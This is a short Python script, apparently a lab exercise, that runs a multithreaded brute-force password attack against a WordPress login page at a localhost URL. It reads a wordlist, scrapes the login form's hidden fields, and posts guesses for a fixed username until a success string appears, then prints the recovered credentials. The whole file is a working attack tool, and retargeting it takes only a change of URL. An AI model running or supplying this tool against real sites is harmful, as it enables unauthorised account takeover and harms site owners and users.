from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to Wordpress!'
TARGET = "http://localhost:80/WordPress/wp-login.php"
WORDLIST = 'passwordlist.txt'

def get_words():#collect words from wordlist
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words



class Bruter:
    def __init__(self, username, url):
        self.username = username       #set username
        self.url = url      #identify url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)
        
    #create threads and begin initializer
    
    def get_params(content):
        params = dict()
        parser = etree.HTMLParser()
        tree = etree.parse(BytesIO(content), parser=parser)
        for elem in tree.findall('//input'):#locate elements in the tree which utilize input
            name = elem.get('name') #locate elements containing name
            if name is not None:
                params[name] = elem.get('value', None)
        return params
    
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
        
    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = Bruter.get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            
            if SUCCESS in resp1.content.decode():
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                self.found = True

if __name__ == '__main__':
    b = Bruter('DarkEtherDE', TARGET)#Target user password
    words= get_words()#collect word
    b.run_bruteforce(words)
                